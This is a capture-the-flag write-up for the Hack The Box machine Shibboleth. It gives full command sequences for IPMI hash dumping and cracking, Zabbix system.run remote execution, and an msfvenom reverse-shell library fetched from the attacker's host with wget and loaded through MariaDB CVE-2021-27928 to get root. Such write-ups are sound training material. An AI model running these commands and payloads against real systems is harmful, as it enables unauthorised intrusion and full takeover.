---
title:     "Hack The Box - Shibboleth"
tags: [linux,medium,zabbit,ipmi,msf,mysql,cve]
categories: HackTheBox
---
[![000_info_card](/img/shibboleth/000_info_card.png)](/img/shibboleth/000_info_card.png)

Shibboleth is a medium machine on HackTheBox created by [knightmare](https://www.hackthebox.com/home/users/profile/8930) & [mrb3n](https://www.hackthebox.com/home/users/profile/2984). For the user part we will abuse an open IPMI port to retrieve the password hash for a user which was reused for the zabbix installation. In zabbix we are able to gain RCE using the host discovery feature leading to a reverse shell on the target. The earlier found password is reused for the ipmi-svc user and we are able to grab the user flag. To obtain root we will abuse a library load in the mysql installation at runtime since the service is running as root.

# User

## Nmap TCP

As usual we start our enumeration of with a nmap scan against all ports followed by a script and version detection scan against the open ones.

`All ports`
```
$ sudo nmap -n -sS -p- -T4 10.129.255.116
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 21:49 UTC
Nmap scan report for 10.129.255.116
Host is up (0.034s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 206.83 seconds
```

`Script and version`
```
$ sudo nmap -n -sC -sV -p80 10.129.255.116
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 21:53 UTC
Nmap scan report for 10.129.255.116
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
```

## IPMI

The nmap scan reveals a hostname which we add to our `/etc/hosts` file. Only port 80 is open on the target. Visiting it in our browser we see the home page of FlexStart.

[![005_shibboleth_home](/img/shibboleth/005_shibboleth_home.png)](/img/shibboleth/005_shibboleth_home.png)

Fuzzing for additional vhosts we are able to identify `monitor`, `monitoring` and `zabbix`, which all lead to a zabbix installation after adding them to our `/etc/hosts`.

```
$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.255.116 -H 'Host: FUZZ.shibboleth.htb' -fw 18

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.255.116
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 18
________________________________________________

monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
:: Progress: [114441/114441] :: Job [1/1] :: 496 req/sec :: Duration: [0:02:12] :: Errors: 0 ::
```

Opening it in our browser we see the login page but don't seem to be able to bypass it.

[![010_zabbix_home](/img/shibboleth/010_zabbix_home.png)](/img/shibboleth/010_zabbix_home.png)

Running another nmap scan against the target, this time against the most common UDP ports reveals that the IPMI port is open.

```
$ sudo nmap -sU -T4 -n 10.129.255.116
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 21:48 UTC
Nmap scan report for 10.129.255.116
Host is up (0.033s latency).
Not shown: 959 closed udp ports (port-unreach), 40 open|filtered udp ports (no-response)
PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 1087.26 seconds
```

This protocol allows by design to bruteforce users with a dictionary. Upon a valid username the hashes of a user will be sent. One quick way to abuse this is using metasploit's `scanner/ipmi/ipmi_dumphashes` where we only have to set the rhosts option and run the module.

```
msf6 > use scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts shibboleth.htb
rhosts => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.255.116:623 - IPMI - Hash found: Administrator:8d6f41d7820800006d998f27a85cfa7ff52e800a9b93ec03bf4f92c3021cf3ecdc1c7debb1ef9695a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c8093e2a8fcac1945bb8abe08e984ce6e73d7db
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The hash cracks rather quickly using hashcat leaving us with the credentials `Administrator:ilovepumkinpie1`

```
$ hashcat -m 7300 -O -a 0 hash rockyou.txt
hashcat (v6.2.4) starting
...[snip]...
8d6f41d7820800006d998f27a85cfa7ff52e800a9b93ec03bf4f92c3021cf3ecdc1c7debb1ef9695a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c8093e2a8fcac1945bb8abe08e984ce6e73d7db:ilovepumkinpie1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 8d6f41d7820800006d998f27a85cfa7ff52e800a9b93ec03bf4...73d7db
Time.Started.....: Sat Nov 13 23:21:54 2021 (1 sec)
Time.Estimated...: Sat Nov 13 23:21:55 2021 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 10137.0 kH/s (5.64ms) @ Accel:2048 Loops:1 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7865947/14344388 (54.84%)
Rejected.........: 1627/7865947 (0.02%)
Restore.Point....: 5243993/14344388 (36.56%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: n115701 -> gisellw
Hardware.Mon.#1..: Temp: 43c Fan: 32% Util:  1% Core:1911MHz Mem:4006MHz Bus:16

Started: Sat Nov 13 23:21:47 2021
Stopped: Sat Nov 13 23:21:56 2021
```

## Zabbix RCE

Going back to zabbix we are now able to log into the website.

[![015_zabbix_logged_in](/img/shibboleth/015_zabbix_logged_in.png)](/img/shibboleth/015_zabbix_logged_in.png)

There is only one host listed in the interface.

[![020_zabbix_hosts](/img/shibboleth/020_zabbix_hosts.png)](/img/shibboleth/020_zabbix_hosts.png)

One way to obtain code execution is to clone a discovery rule with a modified key of `system.run[cmd]`. Which runs any command we want on the the host.

[![025_zabbix_discovery](/img/shibboleth/025_zabbix_discovery.png)](/img/shibboleth/025_zabbix_discovery.png)

Testing it with `id` we can quickly confirm the RCE.

[![030_zabbix_rce_poc](/img/shibboleth/030_zabbix_rce_poc.png)](/img/shibboleth/030_zabbix_rce_poc.png)

Next we set up a ncat listener to catch the reverse shell.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

We replace `id` with our reverse shell and also add `,nowait` to not let the execution time out.

[![035_zabbix_shell](/img/shibboleth/035_zabbix_shell.png)](/img/shibboleth/035_zabbix_shell.png)

As we click on test again we get a reverse shell on our listener, which we upgrade using python.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.255.116.
Ncat: Connection from 10.129.255.116:53536.
bash: cannot set terminal process group (1204): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@shibboleth:/$ export TERM=xterm
export TERM=xterm
zabbix@shibboleth:/$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

zabbix@shibboleth:/$ stty rows 69 cols 236
```

There is only one user which has a directory in `/home` `ipmi-svc`.

```
zabbix@shibboleth:/$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Oct 16 12:24 .
drwxr-xr-x 19 root     root     4096 Oct 16 16:41 ..
drwxr-xr-x  4 ipmi-svc ipmi-svc 4096 Nov 13 20:42 ipmi-svc
```

Using the earlier found IPMI/zabbix password we are able to switch user and can grab the first flag.

```
zabbix@shibboleth:/$ su ipmi-svc
Password:
ipmi-svc@shibboleth:/$ wc -c /home/ipmi-svc/user.txt
33 /home/ipmi-svc/user.txt
```

# Root

Checking the `/etc/zabbix/zabbix_server.conf` it leaks the credentials for the database access.

```
ipmi-svc@shibboleth:/$ cat /etc/zabbix/zabbix_server.conf | grep -v ^# | grep .
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
```

Logging into the database we see that mariaDB version `10.3.25` is installed.

```
ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1287
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

This version is vulnerable to [CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928), this means we can load a library at runtime and get code execution as the user the instance is running at, which is root in this case. As a first stap we need to generate our shared library containing a reverse shell. For this we can use msfvenom.

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.93 LPORT=7575 -f elf-so -o CVE-2021-27928.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: CVE-2021-27928.so
```

Next we transfer the payload over to the target using python and wget, we also set up our ncat listener on the port we specified.

```
ipmi-svc@shibboleth:/tmp$ wget 10.10.14.93:8000/CVE-2021-27928.so
--2021-11-13 22:45:02--  http://10.10.14.93:8000/CVE-2021-27928.so
Connecting to 10.10.14.93:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘CVE-2021-27928.so’

CVE-2021-27928.so                                          100%[========================================================================================================================================>]     476  --.-KB/s    in 0s

2021-11-13 22:45:02 (63.8 MB/s) - ‘CVE-2021-27928.so’ saved [476/476]
```

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Now we connect to the database again and load our shared library.

```
ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1287
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
```

This results in a reverse shell on our listener as root and we can add the flag to our connection.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.255.116.
Ncat: Connection from 10.129.255.116:54742.
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@shibboleth:/var/lib/mysql# export TERM=xterm
export TERM=xterm
root@shibboleth:/var/lib/mysql# ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

root@shibboleth:/var/lib/mysql# id
uid=0(root) gid=0(root) groups=0(root)
root@shibboleth:/var/lib/mysql# wc -c /root/root.txt
33 /root/root.txt
```